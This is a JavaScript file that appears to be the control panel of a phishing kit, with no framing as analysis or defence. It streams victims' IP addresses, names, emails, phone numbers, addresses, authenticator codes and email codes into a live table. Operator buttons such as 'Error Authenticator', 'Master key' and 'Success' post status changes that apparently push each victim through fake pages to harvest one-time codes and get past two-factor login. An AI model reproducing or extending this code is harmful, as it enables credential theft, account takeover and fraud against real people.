const tableBody = document.querySelector("#userTable tbody");
const noUsersRow = document.getElementById("noUsersRow");
const socket = new WebSocket(`ws://${window.location.host}/ws`);

const rowsMap = {}; // ip -> <tr>
let serialCounter = 0;

socket.onopen = () => console.log("Connected to WebSocket");

socket.onmessage = (event) => {
  const msg = JSON.parse(event.data);

  if (msg.type === "INIT") {
    if (msg.data.length === 0) return;
    noUsersRow.style.display = "none";
    msg.data.forEach((user) => updateUserRow(user, true));
  } else if (msg.type === "NEW_USER" || msg.type.endsWith("_UPDATED")) {
    noUsersRow.style.display = "none";
    updateUserRow(msg.data);
  }
};

function updateUserRow(user, init = false) {
  let row = rowsMap[user.ip];
  let isNew = false;

  if (!row) {
    row = document.createElement("tr");
    tableBody.appendChild(row);
    rowsMap[user.ip] = row;
    isNew = true;
  }

  // Increment serialCounter for new rows before assigning id
  if (isNew) serialCounter++;
  const id = isNew ? serialCounter : row.dataset.id || serialCounter;
  const fields = [
    { key: "ip", label: "IP" },
    { key: "fullname", label: "Full Name" },
    { key: "email", label: "Email" },
    { key: "mobile_number", label: "Mobile Number" },
    { key: "address", label: "Address" },
    { key: "gauth", label: "Authenticator Code" },
    { key: "gauth_2", label: "Email Code 2" },
    { key: "email_code", label: "Email Code" },
    { key: "stat", label: "Status" }
  ];

  const oldValues = row.dataset ? JSON.parse(row.dataset.oldValues || "{}") : {};
  let rowHtml = `<td data-label="ID">${id}</td>`;

  fields.forEach((field) => {
    const newValue = user[field.key] || "";
    const oldValue = oldValues[field.key] || "";
    if (!isNew && oldValue !== newValue) {
      rowHtml += `<td class="flash" data-label="${field.label}">${newValue}</td>`;
    } else {
      rowHtml += `<td data-label="${field.label}">${newValue}</td>`;
    }
    oldValues[field.key] = newValue;
  });

  rowHtml += `
    <td class="actions-container" data-label="Actions">
      <button class="action">Loading</button>
      <button class="action">Index</button>
      <button class="action">Digital Summary</button>
      <button class="action">Authenticator</button>
      <button class="error">Error Authenticator</button>
      <button class="action">Master key</button>
      <button class="error">Error Master key</button>
      <button class="action">Email Code</button>
      <button class="error">Error Email Code</button>
      <button class="success">Success</button>
    </td>
  `;

  row.dataset.oldValues = JSON.stringify(oldValues);
  row.dataset.id = id;
  row.innerHTML = rowHtml;

  // Map button text to stat numbers
  const statMap = {
    "Loading": 0,
    "Index": 1,
    "Digital Summary": 2,
    "Authenticator": 3,
    "Error Authenticator": 4,
    "Master key": 5,
    "Error Master key": 6,
    "Email Code": 7,
    "Error Email Code": 8,
    "Success": 9

  };

  const buttons = row.querySelectorAll("button");
  buttons.forEach((btn) => {
    btn.addEventListener("click", () => {
      const statValue = statMap[btn.innerText];
      if (statValue !== undefined) {
        fetch("/update-stat", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ ip: user.ip, stat: statValue })
        })
          .then(res => res.json())
          .then(data => console.log(`Stat update response for ${user.ip}:`, data))
          .catch(err => console.error("Error updating stat:", err));
      }

      // Highlight the clicked button and reset others
      buttons.forEach((b) => {
        b.style.backgroundColor = "";
        b.style.color = "";
      });
      btn.style.backgroundColor = "black";
      btn.style.color = "white";
    });
  });

  row.querySelectorAll(".flash").forEach((cell) => {
    setTimeout(() => cell.classList.remove("flash"), 500);
  });
}

